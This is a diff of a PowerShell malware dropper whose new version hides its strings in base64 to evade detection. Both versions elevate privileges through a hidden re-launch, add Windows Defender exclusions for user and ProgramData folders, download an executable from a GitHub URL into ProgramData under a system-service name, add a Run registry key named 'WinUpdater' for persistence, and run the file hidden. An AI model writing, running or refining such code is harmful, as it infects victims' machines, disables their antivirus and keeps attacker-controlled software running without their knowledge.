@@ -1,27 +1,24 @@
-$Code = {
-    if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($MyInvocation.MyCommand.Definition)))" -Verb RunAs
-        exit
-    }
+$s = {
+    $a = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('aQBmACAAKAAhACgAWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMAUAByAGkAbgBjAGkAcABhAGwAXQBbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMATgBSAG8AbABlACgAWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMAQgB1AGkAbAB0AEkAbgBSAG8AbABlAF0AOgA6AEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAKQApACAAewAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgAtAE4AbwBQACAALQBFAHgAIABCAHkAcABhAHMAAHMAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuACAALQBFAG4AYwBvAGQAZQBQAEMAbwBtAG0AYQBuAGQAIAAkACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AFQAbwBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAkAE0AeQBJAG4AdgBvAGMAYQB0AGkAbwBuAC4ATQB5AEMAbwBtAG0AYQBuAGQALgBEAGUAZgBpAG4AaQB0AGkAbwBuACkAKQApACIAIAAtAFYAZQByAGIAIABSAHUAbgBBAHMAOwAgAGUAeABpAHQAIAB9AA=='));
+    Invoke-Expression $a;
 
-    Add-MpPreference -ExclusionPath "C:\ProgramData", "C:\Users" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess "powershell.exe", "win_sys_service.exe", "SystemUpdate.exe" -ErrorAction SilentlyContinue
+    $ex = "Add-MpPreference -ExclusionPath 'C:\ProgramData','C:\Users' -ExclusionProcess 'powershell.exe','win_sys_service.exe'";
+    Invoke-Expression $ex;
 
-    Start-Sleep -Seconds 5
+    Start-Sleep -s 5;
 
-    $u = "https://github.com/srap18/ddoss/raw/refs/heads/main/SystemUpdate.exe"
-    $o = "C:\ProgramData\win_sys_service.exe"
+    $url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL3NyYXAxOC9kZG9zcy9yYXcvcmVmcy9oZWFkcy9tYWluL1N5c3RlbVVwZGF0ZS5leGU='));
+    $path = "C:\ProgramData\win_sys_service.exe";
 
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
     try {
-        $wc = New-Object System.Net.WebClient
-        $wc.DownloadFile($u, $o)
-        Unblock-File -Path "$o" -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinUpdater' -Value "`"$o`"" -ErrorAction SilentlyContinue
-        Start-Process -FilePath "$o" -WindowStyle Hidden -ErrorAction SilentlyContinue
+        $w = New-Object System.Net.WebClient;
+        $w.DownloadFile($url, $path);
+        Unblock-File -Path $path;
+        Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinUpdater' -Value "`"$path`"";
+        Start-Process -FilePath $path -WindowStyle Hidden;
     } catch {}
 }.ToString()
 
-$Encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Code))
-powershell.exe -NoP -W Hidden -Enco $Encoded
+$e = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($s))
+powershell.exe -NoP -W Hidden -Enco $e
